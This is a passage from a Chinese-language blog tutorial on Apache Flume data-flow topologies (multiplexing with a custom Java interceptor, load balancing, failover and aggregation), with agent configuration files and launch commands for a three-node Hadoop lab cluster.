class="line-numbers-rows"><span></span></span></code></pre><p>添加如下内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Name the components on this agent</span>a3.sources <span class="token operator">=</span> r1a3.sinks <span class="token operator">=</span> k1a3.channels <span class="token operator">=</span> c2<span class="token comment" spellcheck="true"># Describe/configure the source</span>a3.sources.r1.type <span class="token operator">=</span> avroa3.sources.r1.bind <span class="token operator">=</span> hadoop102a3.sources.r1.port <span class="token operator">=</span> 4142<span class="token comment" spellcheck="true"># Describe the sink</span>a3.sinks.k1.type <span class="token operator">=</span> file_rolla3.sinks.k1.sink.directory <span class="token operator">=</span> /opt/module/data/flume3<span class="token comment" spellcheck="true"># Describe the channel</span>a3.channels.c2.type <span class="token operator">=</span> memorya3.channels.c2.capacity <span class="token operator">=</span> 1000a3.channels.c2.transactionCapacity <span class="token operator">=</span> 100<span class="token comment" spellcheck="true"># Bind the source and sink to the channel</span>a3.sources.r1.channels <span class="token operator">=</span> c2a3.sinks.k1.channel <span class="token operator">=</span> c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提示：输出的本地目录必须是已经存在的目录，如果该目录不存在，并不会创建新的目录。</p><p>（5）执行配置文件</p><p>分别启动对应的flume进程：flume-flume-dir，flume-flume-hdfs，flume-file-flume。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a3 --conf-file job/group1/flume-flume-dir.conf<span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a2 --conf-file job/group1/flume-flume-hdfs.conf<span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a1 --conf-file job/group1/flume-file-flume.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（6）启动Hadoop和Hive</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-2.7.2<span class="token punctuation">]</span>$ sbin/start-dfs.sh<span class="token punctuation">[</span>molly@hadoop103 hadoop-2.7.2<span class="token punctuation">]</span>$ sbin/start-yarn.sh<span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/hivehive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> （7）检查HDFS上数据</p><p><img src="/2020/11/15/bigdata-flume2-framework/clip_image004-1637066740449.jpg" alt="img"></p><p>（8）检查/opt/module/datas/flume3目录中数据</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume3<span class="token punctuation">]</span>$ ll-rw-rw-r--. 1 molly molly 5942 5月 22 00:09 1526918887550-3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-2-多路复用-自定义Interceptor"><a href="#4-2-多路复用-自定义Interceptor" class="headerlink" title="4.2 多路复用+自定义Interceptor"></a>4.2 多路复用+自定义Interceptor</h3><p>1)案例需求</p><p>使用Flume采集服务器本地日志，需要按照日志类型的不同，将不同种类的日志发往不同的分析系统。</p><ol start="2"><li>需求分析</li></ol><p>在实际的开发中，一台服务器产生的日志类型可能有很多种，不同类型的日志可能需要发送到不同的分析系统。此时会用到Flume拓扑结构中的Multiplexing结构，Multiplexing的原理是，根据event中Header的某个key的值，将不同的event发送到不同的Channel中，所以我们需要自定义一个Interceptor，为不同类型的event的Header中的key赋予不同的值。</p><p>需求1 架构：在该案例中，我们以端口数据模拟日志，以数字（单个）和字母（单个）模拟不同类型的日志，我们需要自定义interceptor区分数字和字母，将其分别发往不同的分析系统（Channel）。</p><p><img src="/2020/11/15/bigdata-flume2-framework/1637118002481.png" alt="1637118002481"></p><p>需求2架构：</p><p><img src="/2020/11/15/bigdata-flume2-framework/1637068504415.png" alt="1637068504415"></p><ol start="3"><li>需求1实现步骤</li></ol><p>主要分为两大步：</p><p><strong>第一 使用拦截器对数据进行处理：对不同数据添加不同的head</strong></p><p><strong>第二：使用选择器将不同head的数据分发到不同的channel</strong></p><p>（1）创建一个maven项目，并引入以下依赖。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.flume<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>flume-ng-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.9.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）定义CustomInterceptor类并实现Interceptor接口。将写好的代码打包jar，并放到flume的lib目录（/opt/module/flume）下。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>Event<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span>Interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">Interceptor</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Event <span class="token function">intercept</span><span class="token punctuation">(</span>Event event<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> body <span class="token operator">=</span> event<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>body<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'z'</span> <span class="token operator">&amp;&amp;</span> body<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            event<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"type"</span><span class="token punctuation">,</span> <span class="token string">"letter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>body<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> body<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            event<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"type"</span><span class="token punctuation">,</span> <span class="token string">"number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> event<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> List<span class="token operator">&lt;</span>Event<span class="token operator">></span> <span class="token function">intercept</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>Event<span class="token operator">></span> events<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Event event <span class="token operator">:</span> events<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token function">intercept</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> events<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Builder</span> <span class="token keyword">implements</span> <span class="token class-name">Interceptor<span class="token punctuation">.</span>Builder</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> Interceptor <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">CustomInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span>Context context<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）编辑flume配置文件</p><p>为hadoop102上的Flume1配置1个netcat source，1个sink group（2个avro sink），并配置相应的ChannelSelector和interceptor。根据下面的配置，head里是letter就放c1,header是number就放c2。</p><p>a1.sources.r1.selector.mapping.letter = c1</p><p>a1.sources.r1.selector.mapping.number = c2</p><p>完整配置如下：</p><pre><code># Name the components on this agenta1.sources = r1a1.sinks = k1 k2a1.channels = c1 c2# Describe/configure the sourcea1.sources.r1.type = netcata1.sources.r1.bind = localhosta1.sources.r1.port = 44444a1.sources.r1.interceptors = i1a1.sources.r1.interceptors.i1.type = com.atguigu.flume.interceptor.CustomInterceptor$Buildera1.sources.r1.selector.type = multiplexinga1.sources.r1.selector.header = typea1.sources.r1.selector.mapping.letter = c1a1.sources.r1.selector.mapping.number = c2# Describe the sinka1.sinks.k1.type = avroa1.sinks.k1.hostname = hadoop103a1.sinks.k1.port = 4141a1.sinks.k2.type=avroa1.sinks.k2.hostname = hadoop104a1.sinks.k2.port = 4242# Use a channel which buffers events in memorya1.channels.c1.type = memorya1.channels.c1.capacity = 1000a1.channels.c1.transactionCapacity = 100# Use a channel which buffers events in memorya1.channels.c2.type = memorya1.channels.c2.capacity = 1000a1.channels.c2.transactionCapacity = 100# Bind the source and sink to the channela1.sources.r1.channels = c1 c2a1.sinks.k1.channel = c1a1.sinks.k2.channel = c2</code></pre><p>为hadoop103上的Flume4配置一个avro source和一个logger sink。</p><pre class="line-numbers language-bash"><code class="language-bash">a1.sources <span class="token operator">=</span> r1a1.sinks <span class="token operator">=</span> k1a1.channels <span class="token operator">=</span> c1a1.sources.r1.type <span class="token operator">=</span> avroa1.sources.r1.bind <span class="token operator">=</span> hadoop103a1.sources.r1.port <span class="token operator">=</span> 4141a1.sinks.k1.type <span class="token operator">=</span> loggera1.channels.c1.type <span class="token operator">=</span> memorya1.channels.c1.capacity <span class="token operator">=</span> 1000a1.channels.c1.transactionCapacity <span class="token operator">=</span> 100a1.sinks.k1.channel <span class="token operator">=</span> c1a1.sources.r1.channels <span class="token operator">=</span> c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为hadoop104上的Flume3配置一个avro source和一个logger sink。</p><pre class="line-numbers language-bash"><code class="language-bash">a1.sources <span class="token operator">=</span> r1a1.sinks <span class="token operator">=</span> k1a1.channels <span class="token operator">=</span> c1a1.sources.r1.type <span class="token operator">=</span> avroa1.sources.r1.bind <span class="token operator">=</span> hadoop104a1.sources.r1.port <span class="token operator">=</span> 4242a1.sinks.k1.type <span class="token operator">=</span> loggera1.channels.c1.type <span class="token operator">=</span> memorya1.channels.c1.capacity <span class="token operator">=</span> 1000a1.channels.c1.transactionCapacity <span class="token operator">=</span> 100a1.sinks.k1.channel <span class="token operator">=</span> c1a1.sources.r1.channels <span class="token operator">=</span> c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（4）分别在hadoop102，hadoop103，hadoop104上启动flume进程，注意先后顺序。</p><p>（5）在hadoop102使用netcat向localhost:44444发送字母和数字。</p><p>（6）观察hadoop103和hadoop104打印的日志。</p><h3 id="4-3-负载均衡"><a href="#4-3-负载均衡" class="headerlink" title="4.3 负载均衡"></a>4.3 负载均衡</h3><p>负载均衡片处理器提供在多个Sink之间负载平衡的能力。实现支持通过<strong>round_robin（轮询）或者random（随机）</strong>参数来实现负载分发</p><p><strong>默认情况下使用round_robin</strong>，但可以通过配置覆盖这个默认值。还可以通过集成AbstractSinkSelector类来实现用户自己的选择机制。</p><p>当被调用的时候，这选择器通过配置的选择规则选择下一个sink来调用。</p><p>1）案例需求</p><p>使用Flume1监控一个端口，将监控到的内容通过轮询或者随机的方式给到flume2和flume3。Flume2和Flume3将内容打印到控制台。这个时候需要使用LoadBalancingSinkProcessor。</p><p>2）架构分析：</p><p>具体架构选择见下图。</p><p><img src="/2020/11/15/bigdata-flume2-framework/1637067365266.png" alt="1637067365266"></p><p>3）实现步骤</p><p>（1）准备工作</p><p>在/opt/module/flume/job目录下创建group3文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 job<span class="token punctuation">]</span>$ <span class="token function">cd</span> group3/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）创建flume-netcat-flume.conf：flume1的配置</p><p>配置1个netcat source和1个channel、1个sink group（2个sink），分别输送给flume-flume-console2和flume-flume-console3。</p><p>编辑配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#负载均衡</span><span class="token comment" spellcheck="true">#配置Agent a1的组件</span>a1.sources<span class="token operator">=</span>r1a1.channels<span class="token operator">=</span>c1a1.sinks<span class="token operator">=</span>s1 s2<span class="token comment" spellcheck="true">#配置a1的source</span>a1.sources.r1.type<span class="token operator">=</span>netcata1.sources.r1.bind<span class="token operator">=</span>0.0.0.0a1.sources.r1.port<span class="token operator">=</span>3333<span class="token comment" spellcheck="true">##配置a1的channel</span>a1.channels.c1.type<span class="token operator">=</span>memorya1.channels.c1.capacity<span class="token operator">=</span>1000a1.channels.c1.trancactionCapacity<span class="token operator">=</span>100<span class="token comment" spellcheck="true">#配置a1的sink</span>a1.sinks.s1.type<span class="token operator">=</span>avroa1.sinks.s1.hostname<span class="token operator">=</span>node2a1.sinks.s1.port<span class="token operator">=</span>8888a1.sinks.s2.type<span class="token operator">=</span>avroa1.sinks.s2.hostname<span class="token operator">=</span>node3a1.sinks.s2.port<span class="token operator">=</span>8888<span class="token comment" spellcheck="true">#配置sink组以及sink处理器运行</span>a1.sinkgroups <span class="token operator">=</span> g1a1.sinkgroups.g1.sinks <span class="token operator">=</span> s1 s2a1.sinkgroups.g1.processor.type <span class="token operator">=</span> load_balancea1.sinkgroups.g1.processor.backoff <span class="token operator">=</span> <span class="token boolean">true</span><span class="token comment" spellcheck="true">#参数可选round_robin（轮询）或者random（随机）</span>a1.sinkgroups.g1.processor.selector <span class="token operator">=</span> round_robin<span class="token comment" spellcheck="true">#绑定</span>a1.sources.r1.channels<span class="token operator">=</span>c1a1.sinks.s1.channel<span class="token operator">=</span>c1a1.sinks.s2.channel<span class="token operator">=</span>c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）flume2和flume3的配置：两个配置是一样的.flume-flume-console2，flume-flume-console1</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 配置Agent a1的组件</span>a1.sources<span class="token operator">=</span>r1a1.channels<span class="token operator">=</span>c1a1.sinks<span class="token operator">=</span>s1<span class="token comment" spellcheck="true"># 配置a1的source</span>a1.sources.r1.type<span class="token operator">=</span>avroa1.sources.r1.bind<span class="token operator">=</span>0.0.0.0a1.sources.r1.port<span class="token operator">=</span>8888<span class="token comment" spellcheck="true"># 配置a1的channel</span>a1.channels.c1.type<span class="token operator">=</span>memory<span class="token comment" spellcheck="true"># 配置a1的sink</span>a1.sinks.s1.type<span class="token operator">=</span>logger<span class="token comment" spellcheck="true"># 绑定</span>a1.sources.r1.channels<span class="token operator">=</span>c1a1.sinks.s1.channel<span class="token operator">=</span>c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（4）执行配置文件</p><p>分别开启对应配置文件：flume-flume-console2，flume-flume-console1，flume-netcat-flume。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a3 --conf-file job/group2/flume-flume-console2.conf -Dflume.root.logger<span class="token operator">=</span>INFO,console<span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a2 --conf-file job/group2/flume-flume-console1.conf -Dflume.root.logger<span class="token operator">=</span>INFO,console<span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a1 --conf-file job/group2/flume-netcat-flume.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（6）使用netcat工具向本机的44444端口发送内容</p><pre class="line-numbers language-bash"><code class="language-bash">$ nc localhost 44444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（7）查看Flume2及Flume3的控制台打印日志</p><h3 id="4-4-故障转移"><a href="#4-4-故障转移" class="headerlink" title="4.4 故障转移"></a>4.4 故障转移</h3><p>1）案例需求</p><p>使用Flume1监控一个端口，其sink组中的sink分别对接Flume2和Flume3，采用FailoverSinkProcessor，实现故障转移的功能。</p><p><strong>2）需求分析</strong></p><p><img src="/2020/11/15/bigdata-flume2-framework/1637067455399.png" alt="1637067455399"></p><p><img src="/2020/11/15/bigdata-flume2-framework/1637116934865.png" alt="1637116934865">3）实现步骤</p><p>（1）准备工作</p><p>在/opt/module/flume/job目录下创建group2文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 job<span class="token punctuation">]</span>$ <span class="token function">cd</span> group2/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）创建flume-netcat-flume.conf</p><p>配置1个netcat source和1个channel、1个sink group（2个sink），分别输送给flume-flume-console1和flume-flume-console2。</p><p>编辑配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 group2<span class="token punctuation">]</span>$ vim flume-netcat-flume.conf<span class="token comment" spellcheck="true">#添加如下内容</span><span class="token comment" spellcheck="true"># Name the components on this agent</span>a1.sources <span class="token operator">=</span> r1a1.channels <span class="token operator">=</span> c1a1.sinkgroups <span class="token operator">=</span> g1a1.sinks <span class="token operator">=</span> k1 k2<span class="token comment" spellcheck="true"># Describe/configure the source</span>a1.sources.r1.type <span class="token operator">=</span> netcata1.sources.r1.bind <span class="token operator">=</span> localhosta1.sources.r1.port <span class="token operator">=</span> 44444<span class="token comment" spellcheck="true">#设置sinkgroups processor为failover</span>a1.sinkgroups.g1.processor.type <span class="token operator">=</span> failover<span class="token comment" spellcheck="true">#两个sink，k1与k2,其中2个优先级是5和10</span>a1.sinkgroups.g1.processor.priority.k1 <span class="token operator">=</span> 5a1.sinkgroups.g1.processor.priority.k2 <span class="token operator">=</span> 10<span class="token comment" spellcheck="true">#failover time的上限可以通过maxpenalty 属性来进行设置默认10s。</span>a1.sinkgroups.g1.processor.maxpenalty <span class="token operator">=</span> 10000<span class="token comment" spellcheck="true"># Describe the sink</span>a1.sinks.k1.type <span class="token operator">=</span> avroa1.sinks.k1.hostname <span class="token operator">=</span> hadoop102a1.sinks.k1.port <span class="token operator">=</span> 4141a1.sinks.k2.type <span class="token operator">=</span> avroa1.sinks.k2.hostname <span class="token operator">=</span> hadoop102a1.sinks.k2.port <span class="token operator">=</span> 4142<span class="token comment" spellcheck="true"># Describe the channel</span>a1.channels.c1.type <span class="token operator">=</span> memorya1.channels.c1.capacity <span class="token operator">=</span> 1000a1.channels.c1.transactionCapacity <span class="token operator">=</span> 100<span class="token comment" spellcheck="true"># Bind the source and sink to the channel</span>a1.sources.r1.channels <span class="token operator">=</span> c1a1.sinkgroups.g1.sinks <span class="token operator">=</span> k1 k2a1.sinks.k1.channel <span class="token operator">=</span> c1a1.sinks.k2.channel <span class="token operator">=</span> c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）创建flume-flume-console1.conf</p><p>配置上级Flume输出的Source，输出是到本地控制台。</p><p>编辑配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 group2<span class="token punctuation">]</span>$ vim flume-flume-console1.conf<span class="token comment" spellcheck="true">#添加如下内容</span><span class="token comment" spellcheck="true"># Name the components on this agent</span>a2.sources <span class="token operator">=</span> r1a2.sinks <span class="token operator">=</span> k1a2.channels <span class="token operator">=</span> c1<span class="token comment" spellcheck="true"># Describe/configure the source</span>a2.sources.r1.type <span class="token operator">=</span> avroa2.sources.r1.bind <span class="token operator">=</span> hadoop102a2.sources.r1.port <span class="token operator">=</span> 4141<span class="token comment" spellcheck="true"># Describe the sink</span>a2.sinks.k1.type <span class="token operator">=</span> logger<span class="token comment" spellcheck="true"># Describe the channel</span>a2.channels.c1.type <span class="token operator">=</span> memorya2.channels.c1.capacity <span class="token operator">=</span> 1000a2.channels.c1.transactionCapacity <span class="token operator">=</span> 100<span class="token comment" spellcheck="true"># Bind the source and sink to the channel</span>a2.sources.r1.channels <span class="token operator">=</span> c1a2.sinks.k1.channel <span class="token operator">=</span> c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（4）创建flume-flume-console2.conf</p><p>配置上级Flume输出的Source，输出是到本地控制台。</p><p>编辑配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 group2<span class="token punctuation">]</span>$ vim flume-flume-console2.conf添加如下内容<span class="token comment" spellcheck="true"># Name the components on this agent</span>a3.sources <span class="token operator">=</span> r1a3.sinks <span class="token operator">=</span> k1a3.channels <span class="token operator">=</span> c2<span class="token comment" spellcheck="true"># Describe/configure the source</span>a3.sources.r1.type <span class="token operator">=</span> avroa3.sources.r1.bind <span class="token operator">=</span> hadoop102a3.sources.r1.port <span class="token operator">=</span> 4142<span class="token comment" spellcheck="true"># Describe the sink</span>a3.sinks.k1.type <span class="token operator">=</span> logger<span class="token comment" spellcheck="true"># Describe the channel</span>a3.channels.c2.type <span class="token operator">=</span> memorya3.channels.c2.capacity <span class="token operator">=</span> 1000a3.channels.c2.transactionCapacity <span class="token operator">=</span> 100<span class="token comment" spellcheck="true"># Bind the source and sink to the channel</span>a3.sources.r1.channels <span class="token operator">=</span> c2a3.sinks.k1.channel <span class="token operator">=</span> c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（5）执行配置文件</p><p>分别开启对应配置文件：flume-flume-console2，flume-flume-console1，flume-netcat-flume。</p><pre><code>[molly@hadoop102 flume]$ bin/flume-ng agent --conf conf/ --name a3 --conf-file job/group2/flume-flume-console2.conf -Dflume.root.logger=INFO,console[molly@hadoop102 flume]$ bin/flume-ng agent --conf conf/ --name a2 --conf-file job/group2/flume-flume-console1.conf -Dflume.root.logger=INFO,console[molly@hadoop102 flume]$ bin/flume-ng agent --conf conf/ --name a1 --conf-file job/group2/flume-netcat-flume.conf</code></pre><p>（6）使用netcat工具向本机的44444端口发送内容</p><pre><code>$ nc localhost 44444</code></pre><p>（7）查看Flume2及Flume3的控制台打印日志</p><p> <strong>因为k1的优先级是5，K2是10因此当K2正常运行的时候，是发送到K2的</strong>。 </p><p>（8）将Flume2 kill，观察Flume3的控制台打印情况。</p><p>我们发现源代理发生事件到K2失败，然后他将K2放入到failover list（故障列表）</p><p>因为K1还是正常运行的，因此这个时候他会接收到数据。</p><p>注：使用jps -ml查看Flume进程。</p><h3 id="4-5聚合"><a href="#4-5聚合" class="headerlink" title="4.5聚合"></a>4.5聚合</h3><p>1）案例需求：</p><p>hadoop102上的Flume-1监控文件/opt/module/group.log，</p><p>hadoop103上的Flume-2监控某一个端口的数据流，</p><p>Flume-1与Flume-2将数据发送给hadoop104上的Flume-3，Flume-3将最终数据打印到控制台。</p><p>2）需求分析</p><p><strong><img src="/2020/11/15/bigdata-flume2-framework/clip_image008.png" alt="img"></strong></p><p>3）实现步骤：</p><p>（1）准备工作</p><p>分发Flume</p><p>[molly@hadoop102 module]$ xsync flume</p><p>在hadoop102、hadoop103以及hadoop104的/opt/module/flume/job目录下创建一个group3文件夹。</p><p>[molly@hadoop102 job]$ mkdir group3</p><p>[molly@hadoop103 job]$ mkdir group3</p><p>[molly@hadoop104 job]$ mkdir group3</p><p>（2）创建flume1-logger-flume.conf</p><p>配置Source用于监控hive.log文件，配置Sink输出数据到下一级Flume。</p><p>在hadoop102上编辑配置文件</p><p>[molly@hadoop102 group3]$ vim flume1-logger-flume.conf </p><p>添加如下内容</p><p># Name the components on this agent</p><p>a1.sources = r1</p><p>a1.sinks = k1</p><p>a1.channels = c1</p><p># Describe/configure the source</p><p>a1.sources.r1.type = exec</p><p>a1.sources.r1.command = tail -F /opt/module/group.log</p><p>a1.sources.r1.shell = /bin/bash -c</p><p># Describe the sink</p><p>a1.sinks.k1.type = avro</p><p>a1.sinks.k1.hostname = hadoop104</p><p>a1.sinks.k1.port = 4141</p><p># Describe the 